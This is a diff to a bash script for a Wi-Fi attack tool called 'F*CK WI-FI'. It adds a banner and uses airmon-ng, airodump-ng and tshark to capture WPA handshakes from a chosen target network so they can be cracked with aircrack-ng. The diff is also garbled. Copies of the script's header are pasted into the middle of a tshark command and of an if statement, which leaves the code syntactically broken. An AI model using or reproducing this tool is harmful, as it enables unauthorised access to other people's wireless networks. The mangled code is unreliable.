@@ -8,6 +8,15 @@ if [[ $EUID -ne 0 ]]; then
     exit 1
 fi
 
+echo ""
+echo "_____________      __.______________.___ "
+echo "\_   _____/  \    /  \   \_   _____/|   |"
+echo " |    __) \   \/\/   /   ||    __)  |   |"
+echo " |     \   \        /|   ||     \   |   |"
+echo " \___  /    \__/\  / |___|\___  /   |___|"
+echo "     \/          \/           \/ F*CK WI-FI"
+echo ""
+
 read -p "Enter the name of the wireless interface (e.g., wlan0): " interface
 
 if [[ -z "$interface" ]]; then
@@ -25,6 +34,42 @@ airodump-ng "$interface"
 
 echo ""
 read -p "Enter the BSSID of the target network: " bssid
+#!/bin/bash
+# https://github.com/rofidoang03/fwifi
+
+clear
+
+if [[ $EUID -ne 0 ]]; then
+    echo "This script must be run as root."
+    exit 1
+fi
+
+read -p "Enter the name of the wireless interface (e.g., wlan0): " interface
+
+if [[ -z "$interface" ]]; then
+    echo "Interface name cannot be empty."
+    exit 1
+fi
+
+if ! iwconfig "$interface" >> /dev/null 2>&1; then
+    echo "Invalid interface. Please provide a valid wireless interface name."
+    exit 1
+fi
+
+airmon-ng check kill ; airmon-ng start "$interface"
+airodump-ng "$interface"
+
+echo ""
+read -p "Enter the BSSID of the target network: " bssid
+
+if [[ -z "$bssid" ]]; then
+    echo "BSSID cannot be empty."
+    exit 1
+fi
+
+# Validating BSSID format
+if ! [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+    echo "Invalid BSSID format. Please enter a BSSID in the format XX:XX:XX:XX:XX:XX."
 
 if [[ -z "$bssid" ]]; then
     echo "BSSID cannot be empty."
@@ -64,9 +109,81 @@ if [ ! -f "$file_pcap" ]; then
 fi
 
 echo ""
-handshakes=$(tshark -r "$file_pcap" -Y "eapol" -T fields -e wlan.bssid -e wlan.da -e wlan.sa -e eapol.keydes.type -E occurrence=f | wc -l)
+handshakes=$(tshark -r "$file_pcap" -Y "eapol" #!/bin/bash
+# https://github.com/rofidoang03/fwifi
 
-if [[ $handshakes -gt 0 ]]; then
+clear
+
+if [[ $EUID -ne 0 ]]; then
+    echo "This script must be run as root."
+    exit 1
+fi
+
+read -p "Enter the name of the wireless interface (e.g., wlan0): " interface
+
+if [[ -z "$interface" ]]; then
+    echo "Interface name cannot be empty."
+    exit 1
+fi
+
+if ! iwconfig "$interface" >> /dev/null 2>&1; then
+    echo "Invalid interface. Please provide a valid wireless interface name."
+    exit 1
+fi
+
+airmon-ng check kill ; airmon-ng start "$interface"
+airodump-ng "$interface"
+
+echo ""
+read -p "Enter the BSSID of the target network: " bssid
+
+if [[ -z "$bssid" ]]; then
+    echo "BSSID cannot be empty."
+    exit 1
+fi
+
+# Validating BSSID format
+if ! [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+    echo "Invalid BSSID format. Please enter a BSSID in the format XX:XX:XX:XX:XX:XX."
+-T fields -e wlan.bssid -e wlan.da -e wlan.sa -e eapol.keydes.type -E occurrence=f | wc -l)
+
+if [[ $handshakes -gt 0 ]]; then#!/bin/bash
+# https://github.com/rofidoang03/fwifi
+
+clear
+
+if [[ $EUID -ne 0 ]]; then
+    echo "This script must be run as root."
+    exit 1
+fi
+
+read -p "Enter the name of the wireless interface (e.g., wlan0): " interface
+
+if [[ -z "$interface" ]]; then
+    echo "Interface name cannot be empty."
+    exit 1
+fi
+
+if ! iwconfig "$interface" >> /dev/null 2>&1; then
+    echo "Invalid interface. Please provide a valid wireless interface name."
+    exit 1
+fi
+
+airmon-ng check kill ; airmon-ng start "$interface"
+airodump-ng "$interface"
+
+echo ""
+read -p "Enter the BSSID of the target network: " bssid
+
+if [[ -z "$bssid" ]]; then
+    echo "BSSID cannot be empty."
+    exit 1
+fi
+
+# Validating BSSID format
+if ! [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+    echo "Invalid BSSID format. Please enter a BSSID in the format XX:XX:XX:XX:XX:XX."
+
     echo ""
     echo "File '$file_pcap' contains $handshakes handshake(s) that can be cracked with aircrack-ng."
     echo ""
